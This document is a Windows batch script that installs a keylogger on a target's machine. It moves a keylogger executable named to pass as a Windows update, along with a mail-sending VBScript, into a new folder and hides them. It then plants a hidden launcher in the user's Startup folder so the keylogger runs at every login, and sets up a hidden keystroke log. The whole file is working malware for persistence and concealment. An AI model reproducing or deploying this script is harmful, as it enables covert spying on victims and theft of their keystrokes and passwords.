@echo OFF

rem This file will make the KeyLogger persistent and make it hidden and placing it in the startup folder.

rem We will first make the directory where we store the important files. We will keep this in Program Data
mkdir C:\Program69\WindowsUpdater
rem Now we will move the keylogger and make all important files here hidden.
move WindowsUpdate.exe C:\Program69\WindowsUpdater
attrib +h WindowsUpdater.exe
move mailSender.vbs C:\Program69\WindowsUpdater
attrib +h mailSender.vbs
move start.vbs C:\Program69\WindowsUpdater
attrib +h start.vbs

rem Now we will make a bat folder and place it in the startup folder, we will also hide this and make it run "start.vbs".
cd C:\Users\%(TARGET'S FIRST NAME)%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
@echo @echo off >> CheckUpdate.bat
@echo cd C:\Program69\WindowsUpdater >> CheckUpdate.bat
@echo start start.vbs >> CheckUpdate.bat
attrib +h CheckUpdate.bat

rem Setting up the Log File...
cd C:\Program69\WindowsUpdater
@echo KEYLOGGING... >>log.txt
attrib +h log.txt
start start.vbs

